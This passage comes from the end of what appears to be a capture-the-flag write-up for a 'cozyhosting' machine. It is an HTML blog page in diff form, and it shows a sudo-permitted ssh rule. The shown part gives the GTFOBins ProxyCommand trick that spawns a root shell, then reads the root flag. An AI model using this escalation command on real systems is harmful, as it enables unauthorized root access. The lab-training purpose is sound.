+    (root) /usr/bin/ssh *</span></span></span></code></pre><div id="https://www.notion.so/b3bf69c85a4848c5886a40ca788dd6fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gtfobins.github.io/gtfobins/ssh/">GTFOBins page</a></span><span class="SemanticString"> to exploit this. The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ProxyCommand</code></span><span class="SemanticString"> are commands that get run on the client prior to the SSH connection. Since it’s run as sudo, this can be abused for arbitrary command execution and privilege escalation:</span></span></p></div><pre id="https://www.notion.so/870565015e1a40648ea7fdf0ab85d26e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>josh@cozyhosting:~$</span></mark></span><span class="SemanticString"><span> sudo ssh -o ProxyCommand=&#x27;;bash 0&lt;&amp;2 1&gt;&amp;2&#x27; x
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@cozyhosting:/home/josh#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/be5d2d65e79d4c8b943d6abd4a6821ef" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6869ff46096e4052870b4153eb7873b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/df15fa19e3da4aaa9923fcf3cdf07253" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@cozyhosting:~#</span></mark></span><span class="SemanticString"><span> cat root.txt
+
+9d082e39************************</span></span></span></code></pre><div id="https://www.notion.so/e01d56a9bf94481cacfd814dcc060dde" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/335510b2374d4695a2c0927d14c71f1a" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
